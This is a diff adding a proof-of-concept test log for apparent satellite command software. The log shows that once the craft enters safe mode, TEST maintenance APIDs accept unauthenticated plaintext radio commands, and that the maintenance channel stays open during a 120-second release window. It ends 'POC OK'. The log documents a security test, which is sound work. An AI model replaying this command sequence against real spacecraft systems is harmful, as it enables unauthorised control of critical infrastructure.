@@ -1,0 +1,25 @@
+[   0.000] ========================================================================
+[   0.000] V-16 implied privileges / TEST window
+[   0.000] ========================================================================
+[   0.000] --> TC apid=0xF0 via=radio AES  payload=-
+[   0.001] <-- TM apid=0x09 AES len=18
+[   0.001] NOMINAL: TEST APID 0xF0 -> 'TESTMODE INACTIVE'
+[   0.001] --> TC apid=0x1D via=radio AES  payload=02
+[   0.001] <-- TM apid=0x1D clear len=4
+[   0.001] --> TC apid=0xF0 via=radio clear payload=-
+[   0.001] <-- TM apid=0xF0 clear len=5
+[   0.001] safe mode: TEST APID 0xF0 -> b'\xf0TEST'
+[   0.001] --> TC apid=0xF5 via=radio clear payload=-
+[   0.001] <-- TM apid=0xF5 clear len=5
+[   0.001] safe mode: TEST APID 0xF5 -> b'\xf5TEST'
+[   0.001] --> TC apid=0xFF via=radio clear payload=-
+[   0.001] <-- TM apid=0xFF clear len=5
+[   0.001] safe mode: TEST APID 0xFF -> b'\xffTEST'
+[   0.001] TEST commands carry no authentication of their own: whoever drops the craft into safe mode owns the maintenance channel
+[   0.001] --> TC apid=0x1D via=radio clear payload=03
+[   0.001] <-- TM apid=0x1D clear len=4
+[   0.001] <-- TM apid=0x09 clear len=15
+[   0.001] release attempt inside the 120 s window -> 'RELEASE WINDOW' (maintenance stays open meanwhile)
+[   0.001] ========================================================================
+[   0.001] POC OK
+[   0.001] ========================================================================
